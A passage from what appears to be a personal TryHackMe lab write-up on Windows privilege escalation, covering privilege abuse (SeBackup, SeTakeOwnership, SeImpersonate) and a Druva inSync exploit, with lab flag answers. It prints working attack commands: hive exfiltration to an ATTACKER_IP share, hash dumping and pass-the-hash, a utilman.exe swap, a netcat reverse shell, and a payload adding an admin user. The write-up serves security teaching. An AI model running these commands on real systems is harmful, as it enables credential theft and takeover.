+python3.9 /opt/impacket/examples/smbserver.py <span class="nt">-smb2support</span> <span class="nt">-username</span> THMBackup <span class="nt">-password</span> CopyMaster555 public share
+</code></pre></div></div>
+
+<p>This will create a share named <code class="language-plaintext highlighter-rouge">public</code> pointing to the <code class="language-plaintext highlighter-rouge">share</code> directory, which requires the username and password of our current windows session. After this, we can use the <code class="language-plaintext highlighter-rouge">copy</code> command in our windows machine to transfer both files to our attacking machine:</p>
+
+<pre><code class="language-cmd">copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+</code></pre>
+
+<p>And use impacket to retrieve the users’ password hashes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3.9 /opt/impacket/examples/secretsdump.py <span class="nt">-sam</span> sam.hive <span class="nt">-system</span> system.hive LOCAL
+</code></pre></div></div>
+
+<p>We can finally use the Administrator’s hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3.9 /opt/impacket/examples/psexec.py <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.130.171.47
+</code></pre></div></div>
+
+<h3 id="setakeownership">SeTakeOwnership</h3>
+
+<p>The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service’s executable.</p>
+
+<p>To get the SeTakeOwnership privilege, we need to open a command prompt using the “Open as administrator” option.</p>
+
+<p>We check our privileges:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-15.png" alt="" /></p>
+
+<p>We’ll abuse <code class="language-plaintext highlighter-rouge">utilman.exe</code> to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/a5437a609e41d982b320967667e9b97a.png" alt="" /></p>
+
+<p>Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.</p>
+
+<p>To replace utilman, we will start by taking ownership of it with the following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>takeown /f C:\Windows\System32\Utilman.exe
+</code></pre></div></div>
+
+<p>Notice that being the owner of a file doesn’t necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+</code></pre></div></div>
+
+<p>After this, we will replace utilman.exe with a copy of cmd.exe:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy cmd.exe utilman.exe
+</code></pre></div></div>
+
+<p>To trigger utilman, we will lock our screen from the start button:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/dd7290ca93369cee33182023cb9190ff.png" alt="" /></p>
+
+<p>And finally, proceed to click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges.</p>
+
+<h3 id="seimpersonate--seassignprimarytoken">SeImpersonate / SeAssignPrimaryToken</h3>
+
+<p>These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.</p>
+
+<p>Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.</p>
+
+<p>Let’s assume we have an FTP service running with user <code class="language-plaintext highlighter-rouge">ftp</code>. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann’s:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/6e5768172fbb97d6777dde7e15a3fcfc.png" alt="" /></p>
+
+<p>There are several reasons why using ftp’s token is not the best idea:</p>
+
+<ul>
+  <li>For the files to be served correctly, they would need to be accessible to the <code class="language-plaintext highlighter-rouge">ftp</code> user. In the example above, the FTP service would be able to access Ann’s files, but not Bill’s files, as the DACL in Bill’s files doesn’t allow user <code class="language-plaintext highlighter-rouge">ftp</code>. This adds complexity as we must manually configure specific permissions for each served file/directory.</li>
+  <li>For the operating system, all files are accessed by user <code class="language-plaintext highlighter-rouge">ftp</code>, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it.</li>
+  <li>If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the <code class="language-plaintext highlighter-rouge">ftp</code> user has access.</li>
+</ul>
+
+<p>If, on the other hand, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/89e74e14454edc10fa2bd541ac359772.png" alt="" /></p>
+
+<p>Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann’s access token and use it to access her files. This way, the files don’t need to provide access to user <code class="language-plaintext highlighter-rouge">ftp</code> in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won’t be able to access Jude’s or Bill’s files during that session.</p>
+
+<p>Thus,  if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.</p>
+
+<p>In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs.</p>
+
+<p>We can elevate our privileges by doing the following:</p>
+
+<ol>
+  <li>Spawn a process so that users can connect and authenticate to it for impersonation to occur.</li>
+  <li>Find a way to force privileged users to connect and authenticate to the spawned malicious process.</li>
+</ol>
+
+<p>We can accomplish this by using RogueWinRM.</p>
+
+<p>We assume we have already compromised a website running on IIS and that we have planted a web shell there.</p>
+
+<p>We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/4603506a36f4bbda602dc67cdc845d9f.png" alt="" /></p>
+
+<p>Further, we need to upload the exploit (RogueWinRM) to the target.</p>
+
+<p>The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.</p>
+
+<p>If, for some reason, the WinRM service isn’t running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.</p>
+
+<p>We can then trigger the RogueWinRM exploit in the webshell and generate a reverse shell to our machine:</p>
+
+<pre><code class="language-cmd">c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+</code></pre>
+
+<p>The <code class="language-plaintext highlighter-rouge">-p</code> parameter specifies the executable to be run by the exploit, which is <code class="language-plaintext highlighter-rouge">nc64.exe</code> in this case. 
+The <code class="language-plaintext highlighter-rouge">-a</code> parameter is used to pass arguments to the executable. 
+Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be <code class="language-plaintext highlighter-rouge">-e cmd.exe ATTACKER_IP 4442</code>.</p>
+
+<h3 id="questions-4">Questions</h3>
+
+<p>We chose to go with the second method:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-18.png" alt="" /></p>
+
+<p>After this we locked our screen and clicked on the “Ease of Access” button, which now runs <code class="language-plaintext highlighter-rouge">cmd.exe</code> instead of <code class="language-plaintext highlighter-rouge">utilman.exe</code>:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-20.png" alt="" /></p>
+
+<p>We navigate to Administrator’s Desktop to get the flag:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-21.png" alt="" /></p>
+
+<p>Q: Get the flag on the Administrator’s desktop.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{SEFLAGPRIVILEGE}</code></p>
+
+<h2 id="abusing-vulnerable-software">Abusing vulnerable software</h2>
+
+<h3 id="unpatched-software">Unpatched Software</h3>
+
+<p>Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the <code class="language-plaintext highlighter-rouge">wmic</code> tool to list software installed on the target system and its versions.</p>
+
+<pre><code class="language-cmd">wmic product get name,version,vendor
+</code></pre>
+
+<p>Remember that the <code class="language-plaintext highlighter-rouge">wmic product</code> command may not return all installed programs. Thus always check desktop shortcuts, available services etc.</p>
+
+<p>Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like <a href="https://www.exploit-db.com/">exploit-db(opens in new tab)</a>, <a href="https://packetstormsecurity.com/">packet storm(opens in new tab)</a> or just Google.</p>
+
+<h3 id="case-study-druva-insync-663">Case Study: Druva inSync 6.6.3</h3>
+
+<p>The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation.</p>
+
+<p>The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. RPC is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.</p>
+
+<p>In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.</p>
+
+<p>A patch was issued, where they decided to check that the executed command started with the string <code class="language-plaintext highlighter-rouge">C:\ProgramData\Druva\inSync4\</code>, where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute <code class="language-plaintext highlighter-rouge">C:\Windows\System32\cmd.exe</code>, which is not in the allowed path; you could simply ask the server to run <code class="language-plaintext highlighter-rouge">C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> and that would bypass the check successfully.</p>
+
+<p>The exploit has the following idea:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/ff706d6530426d3123c0983acd61f934.png" alt="" /></p>
+
+<p>The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.</p>
+
+<p>The initial exploit script can be found  <a href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">here(opens in new tab)</a>.</p>
+
+<p>We will change the payload to this:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">pwnd</span><span class="w"> </span><span class="nx">SimplePass123</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">localgroup</span><span class="w"> </span><span class="nx">administrators</span><span class="w"> </span><span class="nx">pwnd</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We run the exploit, which successfully creates a user <code class="language-plaintext highlighter-rouge">pwnd</code> with the password <code class="language-plaintext highlighter-rouge">SimplePass123</code>, which is part of the administrators group:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-40.png" alt="" /></p>
+
+<p>We then open a <code class="language-plaintext highlighter-rouge">cmd.exe</code> as administrator and log in using the credentials of the <code class="language-plaintext highlighter-rouge">pwnd</code> user:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-42.png" alt="" /></p>
+
+<p>The flag is found on the Desktop:</p>
+
+<p><img src="/tryhackme/PrivilegeEscalation/WindowsPrivilegeEscalation/2026-04-19_15-44.png" alt="" /></p>
+
+<h3 id="questions-5">Questions</h3>
+
+<p>Q: Get the flag on the Administrator’s desktop.</p>
+
+<p>A: <code class="language-plaintext highlighter-rouge">THM{EZ_DLL_PROXY_4ME}</code></p>
+
+<h2 id="tools-of-the-trade">Tools of the Trade</h2>
+
+<p>Below are a few tools commonly used to identify privilege escalation vectors.</p>
+
+<h3 id="winpeas">WinPEAS</h3>
+
+<p>WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winpeas.exe &gt; outputfile.txt
+</code></pre></div></div>
+
+<p>WinPEAS can be downloaded <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">here</a></p>
+
+<h3 id="privesccheck">PrivescCheck</h3>
+
+<p>PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.</p>
+
+<p>PrivescCheck can be downloaded <a href="https://github.com/itm4n/PrivescCheck">here(opens in new tab)</a>.</p>
+
+<p><strong>Reminder</strong>: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the <code class="language-plaintext highlighter-rouge">Set-ExecutionPolicy</code> cmdlet as shown below.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nt">-Force</span><span class="w"> 
+
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PrivescCheck.ps1</span><span class="w">
+
+</span><span class="n">Invoke-PrivescCheck</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="wes-ng-windows-exploit-suggester---next-generation">WES-NG: Windows Exploit Suggester - Next Generation</h3>
+
+<p>Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG.</p>
+
+<p>WES-NG is a Python script that can be found and downloaded <a href="https://github.com/bitsadmin/wesng">here(opens in new tab)</a>.</p>
+
+<p>Once installed, and before using it, type the <code class="language-plaintext highlighter-rouge">wes.py --update</code> command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.</p>
+
+<p>To use the script, you will need to run the <code class="language-plaintext highlighter-rouge">systeminfo</code> command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.</p>
+
+<p>Once this is done, wes.py can be run as follows:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wes.py systeminfo.txt
+</code></pre></div></div>
+
+<h3 id="metasploit">Metasploit</h3>
+
+<p>If you already have a Meterpreter shell on the target system, you can use the <code class="language-plaintext highlighter-rouge">multi/recon/local_exploit_suggester</code> module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>To learn additional techniques, check out the following resources:</p>
+
+<ul>
+  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">PayloadsAllTheThings - Windows Privilege Escalation(opens in new tab)</a></li>
+  <li><a href="https://github.com/gtworek/Priv2Admin">Priv2Admin - Abusing Windows Privileges(opens in new tab)</a></li>
+  <li><a href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM Exploit(opens in new tab)</a></li>
+  <li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html">Potatoes(opens in new tab)</a></li>
+  <li><a href="https://decoder.cloud/">Decoder’s Blog(opens in new tab)</a></li>
+  <li><a href="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf">Token Kidnapping(opens in new tab)</a></li>
+  <li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">Hacktricks - Windows Local Privilege Escalation</a></li>
+</ul>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
